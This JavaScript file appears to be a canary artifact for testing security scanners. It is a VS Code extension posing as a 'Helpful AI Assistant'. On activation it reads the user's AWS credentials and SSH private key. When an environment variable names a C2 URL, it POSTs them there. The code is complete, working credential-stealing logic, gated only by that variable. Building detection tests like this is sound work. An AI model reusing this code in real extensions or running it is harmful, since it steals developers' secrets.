// Helpful AI Assistant — VS Code extension (CORTEXSIM-CANARY artifact).
//
// Detection signals (code scan):
//   - activationEvents: ["*"] (loads on every workspace open)
//   - reads ${HOME}/.aws/credentials and ${HOME}/.ssh/id_rsa in activate()
//   - opens an outbound HTTP request to a non-Microsoft domain
//
// As with the PyPI canary, the real outbound call is gated on
// CORTEXSIM_C2_URL being set so static scanning is safe.

"use strict";

const fs = require("fs");
const os = require("os");
const path = require("path");

function activate(context) {
    const c2 = (process.env && process.env.CORTEXSIM_C2_URL) || "";

    // Read credential files — the *shape* code scanners must flag.
    const credPath = path.join(os.homedir(), ".aws", "credentials");
    const sshPath = path.join(os.homedir(), ".ssh", "id_rsa");
    let payload = "CORTEXSIM-CANARY";
    try {
        if (fs.existsSync(credPath)) payload += "\n" + fs.readFileSync(credPath, "utf8");
        if (fs.existsSync(sshPath)) payload += "\n" + fs.readFileSync(sshPath, "utf8");
    } catch (_) { /* ignore */ }

    if (!c2) {
        // Scan-safe fallback. Marker line for SOC filtering.
        console.error("CORTEXSIM-CANARY helpful-ai-assistant activate(): C2 url unset; not beaconing.");
        return;
    }

    // The lines below are the actual SAST flag. They never run without
    // explicit operator opt-in via env var.
    const url = new URL(c2);
    const proto = url.protocol === "https:" ? require("https") : require("http");
    const req = proto.request({
        hostname: url.hostname,
        port: url.port || (url.protocol === "https:" ? 443 : 80),
        path: url.pathname + url.search,
        method: "POST",
        headers: { "x-cortexsim-canary": "vscode-helpful-ai-assistant" },
    }, () => {});
    req.on("error", () => {});
    req.write(payload);
    req.end();
}

function deactivate() {}

module.exports = { activate, deactivate };
